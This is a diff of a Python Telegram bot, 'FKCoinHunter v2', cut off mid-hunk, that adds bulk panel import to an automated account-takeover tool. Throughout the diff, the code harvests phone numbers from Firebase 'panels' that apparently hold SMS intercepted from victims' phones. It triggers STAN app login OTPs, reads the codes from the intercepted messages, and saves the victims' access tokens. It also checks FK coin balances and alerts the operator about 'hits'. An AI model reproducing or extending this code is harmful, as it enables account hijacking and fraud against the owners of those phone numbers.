@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-FKCoinHunter - Telegram Bot
-Full conversion of web_panel.py → Telegram
-Hosted on Railway
+FKCoinHunter - Telegram Bot v2
+- Improved UI (progress bars, clean cards, sortable lists)
+- Accepts .txt / .json files for bulk panel import (with preview)
+- All original automation features preserved
 """
 
 import os
@@ -22,7 +23,10 @@ from dataclasses import dataclass, field
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 import requests
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
+from telegram import (
+    Update, InlineKeyboardButton, InlineKeyboardMarkup,
+    InputFile
+)
 from telegram.ext import (
     Application, CommandHandler, CallbackQueryHandler,
     MessageHandler, filters, ContextTypes
@@ -52,7 +56,6 @@ PANELS_FILE = os.path.join(DATA_DIR, "panels.json")
 HITS_FILE = os.path.join(DATA_DIR, "hits.json")
 ACCOUNTS_FILE = os.path.join(DATA_DIR, "stan_accounts_full.json")
 
-# ============ LOGGING ============
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
@@ -66,26 +69,16 @@ admin_chat_id: Optional[int] = None
 
 auto_status = {
     'running': False,
-    'total_processed': 0,
-    'successful': 0,
-    'failed': 0,
-    'no_otp': 0,
-    'already_registered': 0,
-    'hits': 0,
-    'total_balance': 0,
-    'current_action': 'Idle',
-    'recent_accounts': [],
-    'recent_hits': [],
-    'database_url': '',
-    'processing_logs': [],
-    'current_panel': '',
-    'panel_index': 0,
-    'total_panels': 0,
+    'total_processed': 0, 'successful': 0, 'failed': 0,
+    'no_otp': 0, 'already_registered': 0, 'hits': 0,
+    'total_balance': 0, 'current_action': 'Idle',
+    'recent_accounts': [], 'recent_hits': [],
+    'database_url': '', 'processing_logs': [],
+    'current_panel': '', 'panel_index': 0, 'total_panels': 0,
     'last_update': datetime.now().isoformat(),
-    'active_workers': 0
+    'active_workers': 0, 'batch_info': ''
 }
 
-# ============ OTP PATTERNS (from 5.py) ============
 OTP_PATTERNS = [
     {"pattern": r"(\d{4,6})\s+is the otp for mobile verification on STAN", "keyword": "stan", "priority": 1},
     {"pattern": r"STAN.*?OTP[:\s]*(\d{4,6})", "keyword": "stan", "priority": 2},
@@ -112,27 +105,30 @@ class Account:
 
     def to_dict(self):
         return {
-            'phone': self.phone,
-            'access_token': self.access_token,
-            'refresh_token': self.refresh_token,
-            'firebase_token': self.firebase_token,
-            'user_id': self.user_id,
-            'username': self.username,
-            'fk_balance': self.fk_balance,
-            'device_uid': self.device_uid,
-            'user_agent': self.user_agent,
-            'created_at': self.created_at,
-            'saved': self.saved,
-            'device_id': self.device_id,
+            'phone': self.phone, 'access_token': self.access_token,
+            'refresh_token': self.refresh_token, 'firebase_token': self.firebase_token,
+            'user_id': self.user_id, 'username': self.username,
+            'fk_balance': self.fk_balance, 'device_uid': self.device_uid,
+            'user_agent': self.user_agent, 'created_at': self.created_at,
+            'saved': self.saved, 'device_id': self.device_id,
             'firebase_url': self.firebase_url
         }
 
-# ============ NOTIFICATION HELPERS ============
+# ============ UI HELPERS ============
+def progress_bar(percent: float, length: int = 10) -> str:
+    percent = max(0, min(100, percent))
+    filled = int(round(percent / 100 * length))
+    return "█" * filled + "░" * (length - filled)
+
+
+def fmt_num(n: int) -> str:
+    return f"{n:,}"
+
+
 def send_log(message: str, log_type: str = 'info'):
     entry = {
         'timestamp': datetime.now().strftime('%H:%M:%S'),
-        'message': message,
-        'type': log_type
+        'message': message, 'type': log_type
     }
     auto_status['processing_logs'].append(entry)
     if len(auto_status['processing_logs']) > 500:
@@ -141,7 +137,6 @@ def send_log(message: str, log_type: str = 'info'):
 
 
 def notify_admin(text: str):
-    """Send notification to admin chat (thread-safe)."""
     if not admin_chat_id or not bot_app or not main_loop:
         return
     try:
@@ -150,7 +145,7 @@ def notify_admin(text: str):
             main_loop
         )
     except Exception as e:
-        logger.error(f"notify_admin failed: {e}")
+        logger.error(f"notify_admin: {e}")
 
 
 # ============ 5.py FIREBASE LOGIC ============
@@ -159,20 +154,19 @@ def parse_panel_link(link: str) -> Optional[Tuple[str, str]]:
         parsed = urllib.parse.urlparse(link)
         qs = urllib.parse.parse_qs(parsed.query)
         if 's' in qs:
-            s_param = qs['s'][0]
-            s_param += "=" * ((4 - len(s_param) % 4) % 4)
+            s = qs['s'][0] + "=" * ((4 - len(qs['s'][0]) % 4) % 4)
             try:
-                decoded = base64.b64decode(s_param).decode('utf-8')
+                decoded = base64.b64decode(s).decode('utf-8')
                 for sep in ['|||', '|']:
                     if sep in decoded:
                         parts = decoded.split(sep)
                         if len(parts) >= 2:
-                            firebase_url = parts[0].strip()
-                            api_key = parts[1].strip()
-                            if firebase_url and api_key:
-                                if not firebase_url.endswith('/'):
-                                    firebase_url += '/'
-                                return firebase_url, api_key
+                            url = parts[0].strip()
+                            key = parts[1].strip()
+                            if url and key:
+                                if not url.endswith('/'):
+                                    url += '/'
+                                return url, key
             except:
                 pass
     if "firebaseio.com" in link or "firebasedatabase.app" in link:
@@ -182,38 +176,67 @@ def parse_panel_link(link: str) -> Optional[Tuple[str, str]]:
     return None
 
 
+def parse_urls_from_text(text: str) -> List[str]:
+    """Parse panel URLs from plain text (one per line, # comments allowed)."""
+    urls = []
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        # Split on commas/whitespace; keep URL-like tokens
+        for token in re.split(r'[,\s]+', line):
+            token = token.strip()
+            if not token:
+                continue
+            if (token.startswith('http') or 'firebase' in token.lower()
+                    or '?s=' in token):
+                urls.append(token)
+    return urls
+
+
+def parse_urls_from_json(text: str) -> List[str]:
+    """Accept JSON array of strings, or object with 'urls'/'panels' key."""
+    try:
+        data = json.loads(text)
+        if isinstance(data, list):
+            return [u.strip() for u in data if isinstance(u, str) and u.strip()]
+        if isinstance(data, dict):
+            for key in ('urls', 'panels', 'links'):
+                if key in data and isinstance(data[key], list):
+                    return [u.strip() for u in data[key]
+                            if isinstance(u, str) and u.strip()]
+    except Exception:
+        pass
+    return []
+
+
 def fetch_phones_from_panel(panel: dict, limit: int = 100) -> List[Tuple[str, str]]:
     url = panel["url"]
     try:
-        clients_req = requests.get(url + 'clients.json', timeout=5)
-        clients = clients_req.json() or {}
+        clients = requests.get(url + 'clients.json', timeout=5).json() or {}
     except Exception as e:
-        send_log(f"❌ Failed to fetch clients from {panel.get('name')}: {e}", 'error')
+        send_log(f"❌ Fetch clients failed ({panel.get('name')}): {e}", 'error')
         return []
-
     phones = []
     count = 0
     for c_id, c_data in clients.items():
         if count >= limit:
             break
-        if not isinstance(c_data, dict):
-            continue
-        if not c_data.get("status"):
+        if not isinstance(c_data, dict) or not c_data.get("status"):
             continue
         phone = c_data.get("mobNo") or c_data.get("phone") or c_data.get("mobile")
         if not phone:
             try:
-                msg_resp = requests.get(f"{url}messages/{c_id}.json", timeout=3)
-                if msg_resp.status_code == 200:
-                    msgs = msg_resp.json() or {}
-                    for msg in msgs.values():
-                        if not isinstance(msg, dict):
-                            continue
-                        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
-                        match = re.search(r'\b([6-9]\d{9})\b', text)
-                        if match:
-                            phone = match.group(1)
-                            break
+                r = requests.get(f"{url}messages/{c_id}.json", timeout=3)
+                if r.status_code == 200:
+                    for msg in (r.json() or {}).values():
+                        if isinstance(msg, dict):
+                            txt = str(msg.get("body") or msg.get("message")
+                                      or msg.get("text") or "")
+                            m = re.search(r'\b([6-9]\d{9})\b', txt)
+                            if m:
+                                phone = m.group(1)
+                                break
             except:
                 pass
         if phone:
@@ -228,11 +251,10 @@ def fetch_messages_for_device(firebase_url: str, device_id: str) -> List[Dict]:
     if not firebase_url or not device_id:
         return []
     try:
-        url = f"{firebase_url}messages/{device_id}.json"
-        resp = requests.get(url, timeout=5)
-        if resp.status_code != 200:
+        r = requests.get(f"{firebase_url}messages/{device_id}.json", timeout=5)
+        if r.status_code != 200:
             return []
-        msgs = resp.json()
+        msgs = r.json()
         if not msgs:
             return []
         sorted_msgs = sorted(
@@ -240,69 +262,64 @@ def fetch_messages_for_device(firebase_url: str, device_id: str) -> List[Dict]:
             key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0,
             reverse=True
         )
-        messages = []
-        for msg_id, msg_data in sorted_msgs[:5]:
-            if isinstance(msg_data, dict):
-                messages.append({
-                    'sender': msg_data.get('sender', 'Unknown'),
-                    'text': msg_data.get('body') or msg_data.get('message') or msg_data.get('text', ''),
-                    'timestamp': msg_id
+        out = []
+        for mid, md in sorted_msgs[:5]:
+            if isinstance(md, dict):
+                out.append({
+                    'sender': md.get('sender', 'Unknown'),
+                    'text': md.get('body') or md.get('message') or md.get('text', ''),
+                    'timestamp': mid
                 })
-        return messages
+        return out
     except Exception as e:
-        send_log(f"Error fetching messages for {device_id}: {e}", 'error')
+        send_log(f"Error fetching msgs ({device_id}): {e}", 'error')
         return []
 
 
-def poll_otp_from_panel(firebase_url: str, device_id: str, sender_keyword: str = "STAN",
-                        timeout: int = OTP_WAIT_SECONDS) -> Optional[str]:
+def poll_otp_from_panel(firebase_url, device_id,
+                        sender_keyword="STAN",
+                        timeout=OTP_WAIT_SECONDS) -> Optional[str]:
     start = time.time()
-    trigger_time = int(time.time() * 1000)
+    trigger = int(time.time() * 1000)
     while time.time() - start < timeout:
         try:
-            url = f"{firebase_url}messages/{device_id}.json"
-            resp = requests.get(url, timeout=3)
-            if resp.status_code != 200:
-                time.sleep(1)
-                continue
-            msgs = resp.json()
+            r = requests.get(f"{firebase_url}messages/{device_id}.json", timeout=3)
+            if r.status_code != 200:
+                time.sleep(1); continue
+            msgs = r.json()
             if not msgs:
-                time.sleep(1)
-                continue
-            for msg_id in sorted(msgs.keys(), reverse=True):
-                msg_data = msgs[msg_id]
-                if not isinstance(msg_data, dict):
+                time.sleep(1); continue
+            for mid in sorted(msgs.keys(), reverse=True):
+                md = msgs[mid]
+                if not isinstance(md, dict):
                     continue
                 try:
-                    msg_ts = int(msg_id)
+                    if int(mid) < trigger:
+                        continue
                 except:
                     continue
-                if msg_ts < trigger_time:
-                    continue
-                sender = msg_data.get("sender", "")
-                body = msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or ""
+                sender = md.get("sender", "")
+                body = md.get("body") or md.get("message") or md.get("text") or ""
                 if sender_keyword.lower() in sender.lower():
-                    for pattern_config in OTP_PATTERNS:
-                        pattern = pattern_config["pattern"]
-                        kw = pattern_config["keyword"]
-                        if kw and kw.lower() not in body.lower():
+                    for pc in OTP_PATTERNS:
+                        if pc["keyword"] and pc["keyword"].lower() not in body.lower():
                             continue
-                        match = re.search(pattern, body, re.IGNORECASE)
-                        if match:
-                            otp = match.group(1)
+                        m = re.search(pc["pattern"], body, re.IGNORECASE)
+                        if m:
+                            otp = m.group(1)
                             if 4 <= len(otp) <= 6:
                                 return otp
-                    match = re.search(r'(?<!\d)(\d{4}|\d{6})(?!\d)', body)
-                    if match:
-                        return match.group(0)
+                    m = re.search(r'(?<!\d)(\d{4}|\d{6})(?!\d)', body)
+                    if m:
+                        return m.group(0)
             time.sleep(1)
-        except Exception:
+        except:
             time.sleep(1)
     return None
 
 
 # ============ STAN API ============
-def format_phone(phone: str) -> str:
+def format_phone(phone):
     phone = re.sub(r'[^0-9+]', '', phone.strip())
     if phone.startswith('+91') and len(phone) == 13:
         return phone
@@ -315,150 +332,163 @@ def format_phone(phone: str) -> str:
     return f"+91{phone[-10:]}" if len(phone) >= 10 else f"+91{phone}"
 
 
-def send_stan_otp(phone, user_agent):
-    url = f"{STAN_API_BASE}/api/v1/auth/otp/store/send"
-    headers = {
-        "x-api-key": STAN_API_KEY, "appversion": "500", "platform": "android",
-        "user-agent": user_agent, "accept": "application/json, text/plain, */*",
-        "content-type": "application/json", "origin": "https://www.stanshop.co",
-        "x-requested-with": "mark.via.gp",
-    }
+def send_stan_otp(phone, ua):
     try:
-        r = requests.post(url, headers=headers, json={"phone": phone}, timeout=30)
+        r = requests.post(
+            f"{STAN_API_BASE}/api/v1/auth/otp/store/send",
+            headers={
+                "x-api-key": STAN_API_KEY, "appversion": "500",
+                "platform": "android", "user-agent": ua,
+                "accept": "application/json, text/plain, */*",
+                "content-type": "application/json",
+                "origin": "https://www.stanshop.co",
+                "x-requested-with": "mark.via.gp",
+            },
+            json={"phone": phone}, timeout=30
+        )
         if r.status_code == 200:
-            data = r.json()
-            if data.get("statusCode") == 10047 or "already" in str(data).lower():
+            d = r.json()
+            if d.get("statusCode") == 10047 or "already" in str(d).lower():
                 return {"success": False, "already_registered": True}
-            return {"success": True, "data": data}
+            return {"success": True, "data": d}
         return {"success": False, "error": f"HTTP {r.status_code}"}
     except Exception as e:
         return {"success": False, "error": str(e)}
 
 
-def verify_stan_otp(phone, otp, user_agent, device_uuid):
-    url = f"{STAN_API_BASE}/api/v4/store/verify/otp"
-    payload = {
-        "phone": phone, "otp": otp, "sessionId": None,
-        "deviceInfo": {"APP_TYPE": "android", "DeviceData": {"deviceUID": device_uuid}},
-        "utmPayload": {}, "campaignUrl": ""
-    }
-    headers = {
-        "x-api-key": STAN_API_KEY, "appversion": "500", "platform": "android",
-        "user-agent": user_agent, "accept": "application/json, text/plain, */*",
-        "content-type": "application/json", "origin": "https://www.stanshop.co",
-        "x-requested-with": "mark.via.gp", "referer": "https://www.stanshop.co/",
-    }
+def verify_stan_otp(phone, otp, ua, uid):
     try:
-        r = requests.post(url, headers=headers, json=payload, timeout=60)
+        r = requests.post(
+            f"{STAN_API_BASE}/api/v4/store/verify/otp",
+            headers={
+                "x-api-key": STAN_API_KEY, "appversion": "500",
+                "platform": "android", "user-agent": ua,
+                "accept": "application/json, text/plain, */*",
+                "content-type": "application/json",
+                "origin": "https://www.stanshop.co",
+                "x-requested-with": "mark.via.gp",
+                "referer": "https://www.stanshop.co/",
+            },
+            json={
+                "phone": phone, "otp": otp, "sessionId": None,
+                "deviceInfo": {"APP_TYPE": "android",
+                               "DeviceData": {"deviceUID": uid}},
+                "utmPayload": {}, "campaignUrl": ""
+            }, timeout=60
+        )
         if r.status_code == 200:
-            data = r.json()
-            if data.get("access_token"):
+            d = r.json()
+            if d.get("access_token"):
                 return {
                     'success': True,
-                    'access_token': data.get("access_token"),
-                    'refresh_token': data.get("refresh_token", ''),
-                    'firebase_token': data.get("firebase_token", ''),
-                    'user_data': data.get("user", {})
+                    'access_token': d["access_token"],
+                    'refresh_token': d.get("refresh_token", ''),
+                    'firebase_token': d.get("firebase_token", ''),
+                    'user_data': d.get("user", {})
                 }
-            if data.get("message") == "Invalid OTP":
+            if d.get("message") == "Invalid OTP":
                 return {'success': False, 'error': 'Invalid OTP'}
-        elif r.status_code == 400:
+        if r.status_code == 400:
             return {'success': False, 'error': 'HTTP 400 - Bad Request'}
         return {'success': False, 'error': f'HTTP {r.status_code}'}
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
 
-def get_stan_balance(access_token, user_agent):
-    if not access_token:
+def get_stan_balance(tok, ua):
+    if not tok:
         return 0
-    url = f"{STAN_API_BASE}/api/v1/shop/client/balance?vendor=all"
-    headers = {
-        "x-api-key": STAN_API_KEY, "appversion": "500", "platform": "android",
-        "user-agent": user_agent, "accept": "application/json, text/plain, */*",
-        "authorization": f"Bearer {access_token}", "countrycode": "IN"
-    }
     try:
-        r = requests.get(url, headers=headers, timeout=30)
+        r = requests.get(
+            f"{STAN_API_BASE}/api/v1/shop/client/balance?vendor=all",
+            headers={
+                "x-api-key": STAN_API_KEY, "appversion": "500",
+                "platform": "android", "user-agent": ua,
+                "accept": "application/json, text/plain, */*",
+                "authorization": f"Bearer {tok}", "countrycode": "IN"
+            }, timeout=30
+        )
         if r.status_code == 200:
-            data = r.json()
-            if data.get("statusCode") == 200:
-                return data.get("message", {}).get("fkcoin_balance", 0)
-        return 0
+            d = r.json()
+            if d.get("statusCode") == 200:
+                return d.get("message", {}).get("fkcoin_balance", 0)
     except:
-        return 0
+        pass
+    return 0
 
 
-# ============ DATABASE MANAGER ============
+# ============ MANAGERS ============
 class DatabaseManager:
     def __init__(self):
-        self.panels: List[Dict] = []
+        self.panels = []
         self.current_panel_index = 0
         self._load()
 
     def _load(self):
-        try:
-            if os.path.exists(PANELS_FILE):
-                with open(PANELS_FILE, 'r', encoding='utf-8') as f:
-                    data = json.load(f)
-                    self.panels = data.get('panels', [])
-                    self.current_panel_index = data.get('current_index', 0)
+        if os.path.exists(PANELS_FILE):
+            try:
+                d = json.load(open(PANELS_FILE, 'r', encoding='utf-8'))
+                self.panels = d.get('panels', [])
+                self.current_panel_index = d.get('current_index', 0)
                 auto_status['total_panels'] = len(self.panels)
                 auto_status['panel_index'] = self.current_panel_index + 1
-        except Exception as e:
-            logger.error(f"load panels: {e}")
-            self.panels = []
+            except Exception as e:
+                logger.error(f"load panels: {e}")
 
     def _save(self):
         try:
-            with open(PANELS_FILE, 'w', encoding='utf-8') as f:
-                json.dump({
-                    'panels': self.panels,
-                    'current_index': self.current_panel_index,
-                    'last_updated': datetime.now().isoformat()
-                }, f, indent=2)
+            json.dump({
+                'panels': self.panels,
+                'current_index': self.current_panel_index,
+                'last_updated': datetime.now().isoformat()
+            }, open(PANELS_FILE, 'w', encoding='utf-8'), indent=2)
         except Exception as e:
             logger.error(f"save panels: {e}")
 
-    def add_databases(self, urls: List[str]) -> int:
-        added = 0
+    def add_databases(self, urls: List[str]) -> Tuple[int, int]:
+        """Returns (added, failed)."""
+        added = failed = 0
         for url in urls:
             url = url.strip()
             if not url:
                 continue
             parsed = parse_panel_link(url)
             if not parsed:
+                failed += 1
                 continue
-            firebase_url, api_key = parsed
-            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0] or f"Panel_{len(self.panels)+1}"
-            panel = {"name": name, "url": firebase_url, "api_key": api_key, "sender": "STAN"}
+            fburi, key = parsed
+            name = (fburi.replace("https://", "").replace("http://", "")
+                    .split('.')[0] or f"Panel_{len(self.panels)+1}")
+            panel = {"name": name, "url": fburi, "api_key": key, "sender": "STAN"}
             if panel not in self.panels:
                 self.panels.append(panel)
                 added += 1
+            else:
+                failed += 1
         self._save()
         auto_status['total_panels'] = len(self.panels)
-        return added
+        return added, failed
 
-    def get_databases(self) -> List[str]:
+    def get_databases(self):
         return [p.get('url', '') for p in self.panels]
 
-    def get_current_db(self) -> Optional[str]:
+    def get_current_db(self):
         if self.panels and 0 <= self.current_panel_index < len(self.panels):
             return self.panels[self.current_panel_index].get('url')
         return None
 
-    def set_current_db(self, index: int) -> bool:
-        if 0 <= index < len(self.panels):
-            self.current_panel_index = index
+    def set_current_db(self, i):
+        if 0 <= i < len(self.panels):
+            self.current_panel_index = i
             self._save()
-            auto_status['panel_index'] = index + 1
-            auto_status['current_panel'] = self.panels[index].get('name', '')
+            auto_status['panel_index'] = i + 1
+            auto_status['current_panel'] = self.panels[i].get('name', '')
             return True
         return False
 
-    def remove_database(self, index: int) -> bool:
-        if 0 <= index < len(self.panels):
-            self.panels.pop(index)
+    def remove_database(self, i):
+        if 0 <= i < len(self.panels):
+            self.panels.pop(i)
             if self.current_panel_index >= len(self.panels):
                 self.current_panel_index = max(0, len(self.panels) - 1)
             self._save()
@@ -467,46 +497,42 @@ class DatabaseManager:
             return True
         return False
 
-    def get_current_panel(self) -> Optional[Dict]:
+    def get_current_panel(self):
         if self.panels and 0 <= self.current_panel_index < len(self.panels):
             return self.panels[self.current_panel_index]
         return None
 
-    def get_panels(self) -> List[Dict]:
+    def get_panels(self):
         return self.panels.copy()
 
-    def move_to_next_panel(self) -> bool:
+    def move_to_next_panel(self):
         if not self.panels:
             return False
         return self.set_current_db((self.current_panel_index + 1) % len(self.panels))
 
 
-# ============ HIT MANAGER ============
 class HitManager:
     def __init__(self):
-        self.hits: List[Dict] = []
+        self.hits = []
         self._load()
 
     def _load(self):
         if os.path.exists(HITS_FILE):
             try:
-                with open(HITS_FILE, 'r', encoding='utf-8') as f:
-                    self.hits = json.load(f)
+                self.hits = json.load(open(HITS_FILE, 'r', encoding='utf-8'))
             except Exception as e:
                 logger.error(f"load hits: {e}")
-                self.hits = []
 
     def _save(self):
         try:
-            with open(HITS_FILE, 'w', encoding='utf-8') as f:
-                json.dump(self.hits, f, indent=2, ensure_ascii=False)
+            json.dump(self.hits, open(HITS_FILE, 'w', encoding='utf-8'),
+                      indent=2, ensure_ascii=False)
         except Exception as e:
             logger.error(f"save hits: {e}")
 
-    def add_hit(self, account: Account, messages: List[Dict], firebase_url: str, device_id: str) -> bool:
-        for h in self.hits:
-            if h.get('phone') == account.phone:
-                return False
+    def add_hit(self, account, messages, fburi, dev_id) -> bool:
+        if any(h.get('phone') == account.phone for h in self.hits):
+            return False
         self.hits.append({
             'phone': account.phone,
             'username': account.username,
@@ -515,44 +541,45 @@ class HitManager:
             'device_uid': account.device_uid,
             'created_at': account.created_at,
             'access_token': (account.access_token[:50] + '...') if account.access_token else '',
-            'firebase_url': firebase_url,
-            'device_id': device_id,
+            'firebase_url': fburi,
+            'device_id': dev_id,
             'messages': messages or []
         })
         self._save()
         return True
 
-    def get_hits(self) -> List[Dict]:
+    def get_hits(self):
         return self.hits.copy()
 
-    def get_hit(self, index: int) -> Optional[Dict]:
-        if 0 <= index < len(self.hits):
-            return self.hits[index].copy()
+    def get_hit(self, i):
+        if 0 <= i < len(self.hits):
+            return self.hits[i].copy()
         return None
 
-    def refresh_messages(self, index: int) -> List[Dict]:
-        hit = self.get_hit(index)
-        if not hit:
+    def refresh_messages(self, i):
+        h = self.get_hit(i)
+        if not h:
             return []
-        msgs = fetch_messages_for_device(hit.get('firebase_url', ''), hit.get('device_id', ''))
-        if 0 <= index < len(self.hits):
-            self.hits[index]['messages'] = msgs
+        msgs = fetch_messages_for_device(h.get('firebase_url', ''),
+                                         h.get('device_id', ''))
+        if 0 <= i < len(self.hits):
+            self.hits[i]['messages'] = msgs
             self._save()
         return msgs
 
 
-# ============ ACCOUNT MANAGER ============
 class AccountManager:
     def __init__(self):
-        self.accounts: List[Account] = []
-        self.processed_numbers: Set[str] = set()
-        self.successful_numbers: Set[str] = set()
-        self.failed_numbers: Set[str] = set()
-        self.no_otp_numbers: Set[str] = set()
+        self.accounts = []
+        self.processed_numbers = set()
+        self.successful_numbers = set()
+        self.failed_numbers = set()
+        self.no_otp_numbers = set()
         self.stats = {
-            'total_processed': 0, 'successful': 0, 'failed': 0, 'no_otp': 0,
-            'already_registered': 0, 'skipped': 0, 'total_balance': 0,
-            'saved_accounts': 0, 'hits': 0, 'http_400_errors': 0
+            'total_processed': 0, 'successful': 0, 'failed': 0,
+            'no_otp': 0, 'already_registered': 0, 'skipped': 0,
+            'total_balance': 0, 'saved_accounts': 0, 'hits': 0,
+            'http_400_errors': 0
         }
         self._lock = threading.Lock()
         self.processed_lock = threading.Lock()
@@ -562,99 +589,97 @@ class AccountManager:
     def _load(self):
         if os.path.exists(ACCOUNTS_FILE):
             try:
-                with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
-                    for d in json.load(f):
-                        if d.get('phone'):
-                            acc = Account(
-                                phone=d.get('phone', ''),
-                                access_token=d.get('access_token', ''),
-                                refresh_token=d.get('refresh_token', ''),
-                                firebase_token=d.get('firebase_token', ''),
-                                user_id=d.get('user_id', 0),
-                                username=d.get('username', 'User'),
-                                fk_balance=d.get('fk_balance', 0),
-                                device_uid=d.get('device_uid', ''),
-                                user_agent=d.get('user_agent', ''),
-                                created_at=d.get('created_at', datetime.now().isoformat()),
-                                saved=d.get('saved', False),
-                                device_id=d.get('device_id', ''),
-                                firebase_url=d.get('firebase_url', '')
-                            )
-                            self.accounts.append(acc)
-                            self.successful_numbers.add(acc.phone)
-                            self.processed_numbers.add(acc.phone)
-                            if acc.fk_balance >= HIT_THRESHOLD:
-                                self.stats['hits'] += 1
+                for d in json.load(open(ACCOUNTS_FILE, 'r', encoding='utf-8')):
+                    if d.get('phone'):
+                        acc = Account(
+                            phone=d.get('phone', ''),
+                            access_token=d.get('access_token', ''),
+                            refresh_token=d.get('refresh_token', ''),
+                            firebase_token=d.get('firebase_token', ''),
+                            user_id=d.get('user_id', 0),
+                            username=d.get('username', 'User'),
+                            fk_balance=d.get('fk_balance', 0),
+                            device_uid=d.get('device_uid', ''),
+                            user_agent=d.get('user_agent', ''),
+                            created_at=d.get('created_at', datetime.now().isoformat()),
+                            saved=d.get('saved', False),
+                            device_id=d.get('device_id', ''),
+                            firebase_url=d.get('firebase_url', '')
+                        )
+                        self.accounts.append(acc)
+                        self.successful_numbers.add(acc.phone)
+                        self.processed_numbers.add(acc.phone)
+                        if acc.fk_balance >= HIT_THRESHOLD:
+                            self.stats['hits'] += 1
             except Exception as e:
                 logger.error(f"load accounts: {e}")
 
-    def _append_account(self, account: Account):
+    def _append(self, acc: Account):
         try:
             data = []
             if os.path.exists(ACCOUNTS_FILE):
-                with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
-                    data = json.load(f)
-            data.append(account.to_dict())
-            with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-                json.dump(data, f, indent=2, ensure_ascii=False)
+                data = json.load(open(ACCOUNTS_FILE, 'r', encoding='utf-8'))
+            data.append(acc.to_dict())
+            json.dump(data, open(ACCOUNTS_FILE, 'w', encoding='utf-8'),
+                      indent=2, ensure_ascii=False)
         except Exception as e:
             logger.error(f"save account: {e}")
 
-    def add_account(self, account: Account, messages=None, firebase_url=None, device_id=None) -> bool:
+    def add_account(self, acc, messages=None, fburi=None, dev_id=None) -> bool:
         with self._lock:
-            for ex in self.accounts:
-                if ex.phone == account.phone:
-                    return False
-            account.device_id = device_id or ""
-            account.firebase_url = firebase_url or ""
-            self.accounts.append(account)
-            self.successful_numbers.add(account.phone)
-            self.processed_numbers.add(account.phone)
+            if any(e.phone == acc.phone for e in self.accounts):
+                return False
+            acc.device_id = dev_id or ""
+            acc.firebase_url = fburi or ""
+            self.accounts.append(acc)
+            self.successful_numbers.add(acc.phone)
+            self.processed_numbers.add(acc.phone)
             self.stats['successful'] += 1
-            if account.fk_balance >= MIN_FK_BALANCE:
-                account.saved = True
+            if acc.fk_balance >= MIN_FK_BALANCE:
+                acc.saved = True
                 self.stats['saved_accounts'] += 1
-            self.stats['total_balance'] += account.fk_balance
-            if account.fk_balance >= HIT_THRESHOLD:
+            self.stats['total_balance'] += acc.fk_balance
+            if acc.fk_balance >= HIT_THRESHOLD:
                 self.stats['hits'] += 1
-                self.hit_manager.add_hit(account, messages or [], firebase_url or "", device_id or "")
+                self.hit_manager.add_hit(acc, messages or [], fburi or "", dev_id or "")
                 auto_status['hits'] = self.stats['hits']
                 notify_admin(
-                    f"⭐ <b>HIT!</b>\n"
-                    f"📱 <code>{account.phone}</code>\n"
-                    f"💰 <b>{account.fk_balance} FK</b>\n"
-                    f"👤 {account.username}"
+                    f"⭐ <b>NEW HIT</b>\n"
+                    f"📱 <code>{acc.phone}</code>\n"
+                    f"💰 <b>{acc.fk_balance} FK</b>\n"
+                    f"👤 {acc.username}"
                 )
-            self._append_account(account)
+            self._append(acc)
             return True
 
-    def mark_processed(self, phone: str):
+    def mark_processed(self, phone):
         with self.processed_lock:
             if phone not in self.processed_numbers:
                 self.processed_numbers.add(phone)
                 self.stats['total_processed'] += 1
                 auto_status['total_processed'] = self.stats['total_processed']
 
-    def mark_failed(self, phone: str, reason: str = 'Unknown'):
+    def mark_failed(self, phone, reason='Unknown'):
         with self._lock:
             self.failed_numbers.add(phone)
             self.stats['failed'] += 1
             auto_status['failed'] = self.stats['failed']
 
-    def mark_no_otp(self, phone: str):
+    def mark_no_otp(self, phone):
         with self._lock:
             self.no_otp_numbers.add(phone)
             self.stats['no_otp'] += 1
             auto_status['no_otp'] = self.stats['no_otp']
 
-    def is_processed(self, phone: str) -> bool:
+    def is_processed(self, phone):
         with self.processed_lock:
-            return phone in self.processed_numbers or phone in self.successful_numbers
+            return (phone in self.processed_numbers
+                    or phone in self.successful_numbers)
 
-    def get_accounts(self) -> List[Dict]:
+    def get_accounts(self):
         return [a.to_dict() for a in self.accounts]
 
-    def get_stats(self) -> Dict:
+    def get_stats(self):
         return self.stats.copy()
 
 
@@ -664,8 +689,8 @@ class AutomationWorker:
         self.am = am
         self.dm = dm
         self.running = False
-        self.thread: Optional[threading.Thread] = None
-        self.executor: Optional[ThreadPoolExecutor] = None
+        self.thread = None
+        self.executor = None
         self.failed_count = 0
         self.processed_count = 0
         self.lock = threading.Lock()
@@ -682,7 +707,7 @@ class AutomationWorker:
             self.thread.start()
         send_log(f"🔄 Automation started ({MAX_WORKERS} workers)", 'success')
         auto_status['running'] = True
-        notify_admin(f"🚀 <b>Automation Started</b> — {MAX_WORKERS} workers")
+        notify_admin(f"🚀 <b>Automation Started</b> • {MAX_WORKERS} workers")
         return True
 
     def stop(self):
@@ -690,18 +715,18 @@ class AutomationWorker:
             self.running = False
             if self.executor:
                 self.executor.shutdown(wait=False)
-        send_log("⏹ Automation stopped", 'warning')
+        send_log("⏹ Stopped", 'warning')
         auto_status['running'] = False
         auto_status['active_workers'] = 0
         auto_status['current_action'] = 'Idle'
+        auto_status['batch_info'] = ''
         notify_admin("⏹ <b>Automation Stopped</b>")
 
     def _move_next_panel(self):
         panels = self.dm.get_panels()
         if not panels:
             return False
-        cur = self.dm.current_panel_index
-        nxt = (cur + 1) % len(panels)
+        nxt = (self.dm.current_panel_index + 1) % len(panels)
         if self.dm.set_current_db(nxt):
             name = self.dm.get_current_panel().get('name', '?')
             send_log(f"🔄 Switched to Panel {nxt+1}/{len(panels)}: {name}", 'info')
@@ -718,20 +743,18 @@ class AutomationWorker:
             try:
                 panels = self.dm.get_panels()
                 if not panels:
-                    send_log("⚠️ No panels. Add one with /addpanel", 'warning')
